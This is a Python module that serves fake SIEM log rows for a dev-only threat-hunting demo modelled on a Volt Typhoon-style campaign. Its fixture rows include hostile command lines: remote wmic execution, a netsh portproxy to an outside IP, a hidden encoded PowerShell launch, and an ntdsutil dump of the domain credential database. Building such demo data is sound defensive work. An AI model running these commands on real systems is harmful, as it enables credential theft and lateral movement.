"""Simulated SIEM client, for demonstration without a real connection.

Explicit mode confined to development: it only exists if `SHL_DEMO_SIEM=true`, and
`build_clients` refuses to enable it outside the `dev` environment. It is not a degraded mode
that would fabricate data behind the analyst's back: each row carries a
`simulation` field, and the front displays a banner. The goal is to show the agent's
reasoning, the anonymization and the report on a controlled set of logs, without access to a SIEM.

The scenario is a "living off the land" campaign in the style of Volt Typhoon: legitimate
system tools misused, lateral movement between internal servers, no obvious malicious
payload. The logs deliberately contain internal identifiers (hosts, accounts, private
IPs): that is what makes the tokenization visible during the demonstration.
"""

from __future__ import annotations

import re
import time
from typing import Any

from middleware.clients.results import QueryOutcome

_SIM = "SIMULATION - demonstration data, no real SIEM queried"

_PROCESS_ROWS: list[dict[str, Any]] = [
    {
        "TimeGenerated": "2026-07-20T02:14:07Z",
        "Computer": "PAR-FS-03.corp.internal",
        "Account": "svc-backup",
        "ProcessName": "wmic.exe",
        "ProcessCommandLine": (
            "wmic /node:PAR-DC-01.corp.internal process call create "
            '"cmd /c netstat -ano > C:\\\\Windows\\\\Temp\\\\n.txt"'
        ),
        "InitiatingProcessFileName": "cmd.exe",
        "RemoteIP": "10.42.8.11",
        "simulation": _SIM,
    },
    {
        "TimeGenerated": "2026-07-20T02:15:33Z",
        "Computer": "PAR-FS-03.corp.internal",
        "Account": "svc-backup",
        "ProcessName": "netsh.exe",
        "ProcessCommandLine": (
            "netsh interface portproxy add v4tov4 listenport=9999 connectaddress=45.155.12.7"
        ),
        "InitiatingProcessFileName": "cmd.exe",
        "RemoteIP": "10.42.8.11",
        "simulation": _SIM,
    },
    {
        "TimeGenerated": "2026-07-20T02:22:48Z",
        "Computer": "PAR-DC-01.corp.internal",
        "Account": "adm-helpdesk",
        "ProcessName": "powershell.exe",
        "ProcessCommandLine": (
            "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAuAC4ALgA="
        ),
        "InitiatingProcessFileName": "wmiprvse.exe",
        "RemoteIP": "10.42.1.4",
        "simulation": _SIM,
    },
    {
        "TimeGenerated": "2026-07-20T02:41:12Z",
        "Computer": "PAR-DC-01.corp.internal",
        "Account": "adm-helpdesk",
        "ProcessName": "ntdsutil.exe",
        "ProcessCommandLine": (
            'ntdsutil "ac i ntds" "ifm" "create full C:\\\\Windows\\\\Temp\\\\ifm" q q'
        ),
        "InitiatingProcessFileName": "powershell.exe",
        "RemoteIP": "10.42.1.4",
        "simulation": _SIM,
    },
]

_SIGNIN_ROWS: list[dict[str, Any]] = [
    {
        "TimeGenerated": "2026-07-20T02:09:55Z",
        "UserPrincipalName": "svc-backup@corp.internal",
        "IPAddress": "10.42.8.11",
        "AppDisplayName": "Windows Remote Management",
        "ResultType": "0",
        "Location": "FR",
        "simulation": _SIM,
    },
    {
        "TimeGenerated": "2026-07-20T02:20:31Z",
        "UserPrincipalName": "adm-helpdesk@corp.internal",
        "IPAddress": "10.42.8.11",
        "AppDisplayName": "Windows Remote Management",
        "ResultType": "0",
        "Location": "FR",
        "simulation": _SIM,
    },
]

_NETWORK_ROWS: list[dict[str, Any]] = [
    {
        "TimeGenerated": "2026-07-20T02:15:40Z",
        "DeviceName": "PAR-FS-03.corp.internal",
        "RemoteIP": "45.155.12.7",
        "RemotePort": 443,
        "RemoteUrl": "update-svc-checkpoint[.]net",
        "ActionType": "ConnectionSuccess",
        "simulation": _SIM,
    },
]


class SimulatedSiemClient:
    """Returns a coherent set of logs based on the subject of the query. Absorbs the
    signatures of the three real clients (Sentinel, Defender, SecOps) via `**_`."""

    def __init__(self, *, siem: str) -> None:
        self._siem = siem

    async def run_query(self, *, query: str, row_cap: int = 200, **_: Any) -> QueryOutcome:
        started = time.monotonic()
        rows = _select_rows(query)
        rows = _echo_indicators(query, rows)
        capped = rows[:row_cap]
        duration_ms = int((time.monotonic() - started) * 1000) + 7
        return QueryOutcome(
            rows=capped,
            truncated=len(rows) > row_cap,
            duration_ms=duration_ms,
            notes=[_SIM],
        )

    async def aclose(self) -> None:  # interface parity with the real clients
        return None


def _select_rows(query: str) -> list[dict[str, Any]]:
    lowered = query.lower()
    if any(word in lowered for word in ("signin", "identity", "logon", "aadsignin")):
        return list(_SIGNIN_ROWS)
    if any(word in lowered for word in ("network", "conn", "devicenetwork", "remoteip")):
        return list(_NETWORK_ROWS)
    return list(_PROCESS_ROWS)


_INDICATOR_RE = re.compile(r"[0-9a-fA-F:.\[\]-]{6,}|[a-z0-9.-]+\.[a-z]{2,}", re.IGNORECASE)


def _echo_indicators(query: str, rows: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """If the query targets an indicator present in the scenario, it surfaces at the top: the
    hunt appears to follow the validated IOC rather than returning a fixed set."""

    candidates = {match.group(0).lower() for match in _INDICATOR_RE.finditer(query)}
    if not candidates:
        return rows

    def matches(row: dict[str, Any]) -> bool:
        haystack = " ".join(str(value) for value in row.values()).lower()
        return any(candidate in haystack for candidate in candidates if len(candidate) > 5)

    hits = [row for row in rows if matches(row)]
    return hits + [row for row in rows if row not in hits] if hits else rows
